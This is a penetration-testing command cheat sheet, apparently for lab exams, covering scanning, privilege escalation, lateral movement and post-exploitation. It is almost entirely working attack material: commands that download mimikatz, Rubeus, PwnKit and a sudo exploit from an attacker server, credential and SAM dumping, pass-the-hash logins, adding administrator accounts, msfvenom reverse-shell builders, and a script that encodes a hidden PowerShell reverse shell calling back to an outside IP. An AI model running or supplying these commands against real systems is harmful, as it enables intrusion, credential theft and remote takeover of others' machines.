# Port Scan
``` bash
nmap -Pn <IP> -oN nmap_<IP>.txt
rustscan -a $target -r 1-10000 -- -sC -sV -oN rust_full.txt
nmap -sC -sV <IP> -v
nmap -T4 -A -p- <IP> -v
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
```

# File downloads(for Windows)
``` powershell
iwr -uri http://192.168.45.200:8000/winPEASx64.exe -o winPEASx64.exe
iwr -uri http://192.168.45.200:8000/SigmaPotato.exe -o SigmaPotato.exe
iwr -uri http://192.168.45.200:8000/mimikatz.exe -o mimikatz.exe
iwr -uri http://192.168.45.200:8000/Rubeus.exe -o Rubeus.exe
iwr -uri http://192.168.45.200:8000/chisel.exe -o chisel.exe
iwr -uri http://192.168.45.200:8000/rustscan.exe -o rustscan.exe
iwr -uri http://192.168.45.200:8000/DecryptAutoLogon.exe -o DecryptAutoLogon.exe
iwr -uri http://192.168.45.200:8000/busybox.exe -o busybox.exe
```

# File downloads(for Linux)
``` bash
wget http://192.168.45.200:8000/rustscan
wget http://192.168.45.200:8000/linpeas.sh
wget http://192.168.45.200:8000/pspy64
wget http://192.168.45.200:8000/PwnKit
wget http://192.168.45.200:8000/CVE-2021-3156.tar
# https://github.com/blasty/CVE-2021-3156
# tar xvf CVE-2021-3156.tar && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich
```

# File transfer
``` shell
Kali> nc <target_ip> 1234 < nmap
Win> nc -lvp 1234 > nmap

Kali> impacket-smbserver -smb2support share .
Win> copy file \\KaliIP\share

scp filename kali@192.168.0.17:/home/kali/
```

# SMB/WINRM
``` bash
crackmapexec smb 10.10.162.142 -u celia.almeda -p 7k8XHk3dMtmpnC7
smbclient -L \\\\10.10.162.142\\ -U celia.almeda --password=7k8XHk3dMtmpnC7
impacket-smbexec -hashes :aad3b435b51404eeaad3b435b51404ee tom_admin@10.10.162.140
evil-winrm -i 10.10.162.142 -u celia.almeda -p 7k8XHk3dMtmpnC7
```

# RDP
``` shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
xfreerdp3 /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.202.145 /dynamic-resolution
```

# mimikatz
``` powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```


# Windows Enumeration
``` powershell
whoami /all
net localgroup administrators
net user /domain
net group "Domain Admins" /domain
winPEASx64.exe
.\SigmaPotato.exe "net user offsec password123 /add"
.\SigmaPotato.exe "net localgroup administrators offsec /add"
.\Rubeus.exe triage
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
dir /s SAM
dir /s SYSTEM
type (Get-PSReadLineOption).HistorySavePath
```

# Linux Enumeration
``` bash
find /var/log -group adm
grep -ri password
find / -perm -u=s -type f 2>/dev/null
./pspy64 -pf -i 1000
ls -lah /etc/cron*
```

# Pivoting
``` shell
Kali> ./chisel server -p 9001 --socks5 --reverse
Win> .\chisel.exe client <Kali-IP>:9001 R:socks
```

# Reverse Shell
## msfconsole
``` bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; set ExitOnSession false; run -j"
```

## msfvenom
``` bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```


## reverse shell base64 encoder Python script
``` python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

# SAM Dump

- C:\windows.old\System32\SAM
- C:\windows.old\System32\SYSTEM

``` powershell
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```

``` bash
impacket-secretsdump -system SYSTEM -sam SAM LOCAL

# impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.207.146
```


# BusyBox

``` shell
.\busybox.exe httpd
.\busybox.exe nc -lp 4444
```

